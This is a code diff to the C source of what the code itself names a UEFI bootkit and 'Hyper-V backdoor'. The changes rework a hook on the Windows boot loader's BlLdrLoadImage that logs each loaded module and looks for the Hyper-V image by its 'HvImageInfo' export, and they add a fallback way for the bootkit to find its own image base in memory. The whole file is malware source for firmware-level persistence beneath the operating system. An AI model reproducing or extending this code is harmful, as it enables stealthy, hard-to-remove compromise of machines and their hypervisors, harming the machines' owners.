@@ -15,7 +15,6 @@
 
 #include <Library/UefiDriverEntryPoint.h>
 #include <Library/UefiBootServicesTableLib.h>
-#include <Library/DebugLib.h>
 #include <Library/UefiRuntimeLib.h>
 
 #include <IndustryStandard/PeImage.h>
@@ -23,7 +22,7 @@
 #include "../../DuetPkg/DxeIpl/X64/VirtualMemory.h"
 
 #include "../config.h"
-#include "../backdoor_client.h"
+#include "../backdoor_client/backdoor_client.h"
 
 #include "common.h"
 #include "printf.h"
@@ -302,19 +301,19 @@ UINT64 __stdcall new_BlLdrLoadImage(
     VOID *arg_01, VOID *arg_02, VOID *arg_03, VOID *arg_04, VOID *arg_05, VOID *arg_06, VOID *arg_07, VOID *arg_08, 
     VOID *arg_09, VOID *arg_10, VOID *arg_11, VOID *arg_12, VOID *arg_13, VOID *arg_14, VOID *arg_15, VOID *arg_16)
 {
-    UINT64 Status = old_BlLdrLoadImage(
-        arg_01, arg_02, arg_03, arg_04, arg_05, arg_06, arg_07, arg_08, 
-        arg_09, arg_10, arg_11, arg_12, arg_13, arg_14, arg_15, arg_16
-    );
+    int Size = 0;    
+    char szModulePath[MAX_MODULE_NAME_SIZE];    
 
     // just for sure
     m_TextOutput = NULL;
 
-    if (Status == 0)
-    {
-        int Size = 0;    
-        char szModulePath[MAX_MODULE_NAME_SIZE];
+    UINT64 Status = old_BlLdrLoadImage(
+        arg_01, arg_02, arg_03, arg_04, arg_05, arg_06, arg_07, arg_08, 
+        arg_09, arg_10, arg_11, arg_12, arg_13, arg_14, arg_15, arg_16
+    );    
 
+    if (arg_02)
+    {
         // second argument contains module path
         UINT16 *pPath = (UINT16 *)arg_02;    
 
@@ -327,11 +326,14 @@ UINT64 __stdcall new_BlLdrLoadImage(
 
         szModulePath[Size] = '\0';
 
+        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): \"%s\"\r\n", szModulePath);
+    }
+
+    if (Status == 0)
+    {
         if (arg_08)
         {
-            LDR_DATA_TABLE_ENTRY *LdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_08;
-
-            DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): \"%s\"\r\n", szModulePath);
+            LDR_DATA_TABLE_ENTRY *LdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_08;            
 
             // check for the Hyper-V image
             if (m_HvInfo.ImageBase == NULL && LdrGetProcAddress(LdrEntry->DllBase, "HvImageInfo") != NULL)
@@ -385,7 +387,6 @@ VOID *FindCallerImage(UINT64 Addr, char *TargetName)
 
         // get image exports
         UINT32 ExportAddr = pHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-
         if (ExportAddr != 0)
         {                    
             EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)RVATOVA(Image, ExportAddr);                    
@@ -721,26 +722,34 @@ _ModuleEntryPoint(
 
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
-    DbgMsg(__FILE__, __LINE__, "  Hyper-V backdoor loaded     \r\n");
+    DbgMsg(__FILE__, __LINE__, "  Hyper-V backdoor loaded!    \r\n");
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
 
 #endif
 
-    if (ImageHandle && m_ImageBase == NULL)
-    {        
-        EFI_LOADED_IMAGE *LoadedImage = NULL;
+    if (m_ImageBase == NULL)
+    {   
+        if (ImageHandle)
+        {     
+            EFI_LOADED_IMAGE *LoadedImage = NULL;
 
-        // bootkit was loaded as EFI application
-        EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);      
-        if (Status == EFI_SUCCESS)
-        {
-            // get current image base
-            m_ImageBase = LoadedImage->ImageBase;
+            // bootkit was loaded as EFI application
+            EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);      
+            if (Status == EFI_SUCCESS)
+            {
+                // get current image base
+                m_ImageBase = LoadedImage->ImageBase;
+            }
+            else
+            {
+                DbgMsg(__FILE__, __LINE__, "HandleProtocol() fails: 0x%X\r\n", Status);
+            }
         }
         else
         {
-            DbgMsg(__FILE__, __LINE__, "HandleProtocol() fails: 0x%X\r\n", Status);
+            // get backdoor image base address
+            m_ImageBase = ImageBaseByAddress(get_addr());
         }
     }
 
